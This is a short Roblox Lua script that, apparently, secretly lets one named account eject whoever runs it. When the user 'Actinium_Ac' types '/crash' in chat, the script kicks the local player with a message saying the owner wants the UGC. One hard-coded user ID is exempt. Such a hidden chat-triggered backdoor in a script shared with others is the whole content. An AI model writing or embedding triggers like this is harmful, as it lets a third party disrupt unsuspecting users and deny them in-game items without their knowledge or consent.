    game:GetService("Players").PlayerAdded:Connect(function(player)
        wait(1)
            game.Players.PlayerAdded:Connect(function(player)
            wait(1)
                player.Chatted:Connect(function(message)
                wait(1)
        if (player.Name == "Actinium_Ac") and message == "/crash" and game.Players.LocalPlayer.UserId ~= 116781531 then
        game.Players.LocalPlayer:Kick("Owner Requested Kick, Owner wants the ugc ;)")
        end
                end)
            end)
        end)
        
        for _, player in ipairs(game.Players:GetPlayers()) do
            player.Chatted:Connect(function(message)
            wait(1)
            if (player.Name == "Actinium_Ac") and message == "/crash" and game.Players.LocalPlayer.UserId ~= 116781531  then
                game.Players.LocalPlayer:Kick("Owner Requested Kick, Owner wants the ugc ;)")
                end
            end)
        end
